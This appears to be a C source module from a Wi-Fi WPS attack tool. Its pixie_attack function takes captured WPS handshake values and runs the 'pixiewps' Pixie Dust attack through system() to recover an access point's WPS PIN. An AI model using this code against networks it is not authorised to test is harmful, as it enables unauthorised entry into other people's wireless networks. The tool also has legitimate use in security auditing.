#include <sys/types.h>
#include "pixie.h"
#include "globule.h"
#include <stdio.h>
#include <stdlib.h>

struct pixie pixie = {0};

void pixie_format(const unsigned char *in, unsigned len, char *outbuf) {
	unsigned i;
	char *out = outbuf;
	for(i = 0; i < len; i++, out+=2) {
		sprintf(out, "%02x", in[i]);
	}
	if(i) *out = 0;
}

void pixie_attack(void) {
	struct pixie *p = &pixie;
	int dh_small = get_dh_small();

	if(p->do_pixie) {
		char cmd[4096];
		snprintf(cmd, sizeof cmd,
		"pixiewps -e %s -s %s -z %s -a %s -n %s %s %s",
		p->pke, p->ehash1, p->ehash2, p->authkey, p->enonce,
		dh_small ? "-S" : "-r" , dh_small ? "" : p->pkr);
		printf("executing %s\n", cmd);
		exit(system(cmd));
	}
	PIXIE_FREE(authkey);
	PIXIE_FREE(pkr);
	PIXIE_FREE(pke);
	PIXIE_FREE(enonce);
	PIXIE_FREE(ehash1);
	PIXIE_FREE(ehash2);
}
